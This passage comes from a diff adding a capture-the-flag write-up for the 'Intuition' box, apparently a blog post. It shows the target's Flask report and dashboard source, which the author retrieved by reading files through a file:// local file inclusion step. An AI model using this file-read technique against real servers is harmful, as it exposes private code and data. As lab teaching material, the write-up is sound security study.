+        &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;report_title&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report_title&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;add_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report_title&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+                &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Bug report submitted successfully! Our team will be checking on this shortly.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+                &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+            &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Error occurred while trying to add the report!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report.report_bug&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report/report_bug_form.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Route for listing all reports (admin only)
+&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@report_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/list_reports&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@admin_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;list_reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_all_reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report/report_list.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Route for viewing details of a specific report (admin only)
+&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@report_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/report/&amp;lt;int:report_id&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@admin_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;report_details&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_report_by_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report/report_details.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Report not found!&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report.report_index&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Route for the about reports page
+&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@report_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/about_reports&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;about_reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report/about_reports.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Theres nothing to interesting here, just some &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;routes&lt;/code&gt; and logic.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Lets check &lt;mark&gt;`file:///app/code/blueprints/dashboard/dashboard.py`&lt;/mark&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Dashboard_PY_LFI.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Again run through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chatgpt&lt;/code&gt; for readability.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flask&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;url_for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;send_file&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.auth.auth_utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;admin_required&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;login_required&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deserialize_user_data&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;blueprints.report.report_utils&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;get_report_by_priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_report_by_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;delete_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;get_all_reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;change_report_priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resolve_report&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdfkit&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib.request&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib.parse&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urlparse&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;zipfile&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ftplib&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FTP&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;datetime&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Define the Blueprint for the dashboard routes
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dashboard_bp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Blueprint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;subdomain&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Path to save PDF reports
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pdf_report_path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;dirname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__file__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;pdf_reports&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Allowed hostnames for PDF report creation
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;allowed_hostnames&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;report.comprezzor.htb&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@admin_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;dashboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Render the dashboard based on user role.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deserialize_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_report_by_priority&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;webdev&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_all_reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;render_template&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dashboard/dashboard.html&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nd&quot;&gt;@dashboard_bp.route&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/report/&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;nd&quot;&gt;@login_required&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_report&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;report_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Render a specific report if the user is authorized.&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookies&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;user_info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;deserialize_user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;user_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
